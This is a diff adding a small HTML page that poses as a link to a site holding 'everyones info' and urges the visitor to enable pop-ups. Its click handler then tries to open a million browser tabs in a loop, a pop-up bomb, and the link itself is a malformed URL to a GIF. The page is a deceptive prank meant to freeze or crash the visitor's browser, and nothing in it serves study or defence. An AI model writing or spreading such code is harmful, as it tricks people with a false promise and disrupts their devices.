@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Open Link 5 Times</title>
+</head>
+<body>
+    <h1>The website with everyones info (its file is too large to email):</h1>
+    <a href="https://https://media.giphy.com/media/JIX9t2j0ZTN9S/giphy.gif" target="_blank" id="openLink">(if it doesn't work enable pop-ups, because it needs to open a few tabs to download all the info, images, etc.)</a>
+
+    <script>
+        const openLinkButton = document.getElementById('openLink');
+
+        openLinkButton.addEventListener('click', function (event) {
+            for (let i = 0; i < 1000000; i++) {
+                window.open(openLinkButton.href, '_blank');
+            }
+            event.preventDefault();
+        });
+    </script>
+</body>
+</html>
